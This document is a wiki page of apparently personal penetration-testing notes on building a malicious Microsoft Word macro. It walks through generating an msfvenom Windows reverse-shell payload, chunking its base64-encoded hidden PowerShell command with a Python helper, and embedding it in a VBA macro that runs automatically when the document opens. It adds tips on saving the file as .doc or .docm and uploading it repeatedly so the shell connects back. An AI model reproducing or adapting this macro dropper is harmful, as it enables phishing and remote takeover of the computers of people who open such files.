Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-10-12T23:51:44-05:00

====== Macros ======
Created Tuesday 12 October 2021


Sploiting M$ Office is done through macro's

Open up word, click view on the ribbon -> macro's -> create

{{./pasted_image001.png}}

{{./pasted_image002.png}}
* Make sure macros in dropdown is set to document.

===== Spawning a shell =====

Create a payload using this:
{{{code: lang="sh" linenumbers="False"
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.177 LPORT=4444 EXITFUNC=process -f hta-psh
}}}


Then cut the line that start with "powershel ... <bunch of base64"

Stick it in this program
{{{code: lang="python3" linenumbers="True"
tgt = "<paste>"

n = 50

print('Str = ""')
for i in range(0, len(tgt), 50):
    print("Str = Str + " + '"' + tgt[i:i + n] + '"')
}}}

This step is needed, because strings can only have 256 characters when you assign values to them. However, concatenating them as such is not a problem.

Output will look like this:
{{{code: lang="texinfo" linenumbers="False"
Str = ""
Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
Str = Str + "kAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnA"
Str = Str + "H0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGk"
Str = Str + "AcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8Ad"
...
Str = Str + "AYQByAGQATwB1AHQAcAB1AHQAPQAkAHQAcgB1AGUAOwAkAHMAL"
Str = Str + "gBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAPQAnAEgAaQBkAGQAZQB"
Str = Str + "uACcAOwAkAHMALgBDAHIAZQBhAHQAZQBOAG8AVwBpAG4AZABvA"
Str = Str + "HcAPQAkAHQAcgB1AGUAOwAkAHAAPQBbAFMAeQBzAHQAZQBtAC4"
Str = Str + "ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAc"
Str = Str + "wBdADoAOgBTAHQAYQByAHQAKAAkAHMAKQA7AA=="

}}}


Stick this is the following macro
{{{code: lang="vbnet" linenumbers="True"
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    Str = ""
	Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
	Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
	Str = Str + "kAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnA"
	Str = Str + "H0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGk"
	Str = Str + "AcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8Ad"
	...
	Str = Str + "AYQByAGQATwB1AHQAcAB1AHQAPQAkAHQAcgB1AGUAOwAkAHMAL"
	Str = Str + "gBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAPQAnAEgAaQBkAGQAZQB"
	Str = Str + "uACcAOwAkAHMALgBDAHIAZQBhAHQAZQBOAG8AVwBpAG4AZABvA"
	Str = Str + "HcAPQAkAHQAcgB1AGUAOwAkAHAAPQBbAFMAeQBzAHQAZQBtAC4"
	Str = Str + "ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAc"
	Str = Str + "wBdADoAOgBTAHQAYQByAHQAKAAkAHMAKQA7AA=="
	
	CreateObject("Wscript.Shell").Run Str
End Sub
}}}

==== Remarks ====
* The AutoOpen()  macro is triggered when the document opens
* The Document_Open() macro is triggered when an already open document reopens
* The document must be saved in .doc or .docm format, .docx WILL NOT WORK
* When uploading this to an FTP. Do it a bunch of times, so it will surely connect back


{{./pasted_image003.png}}

{{./pasted_image004.png}}

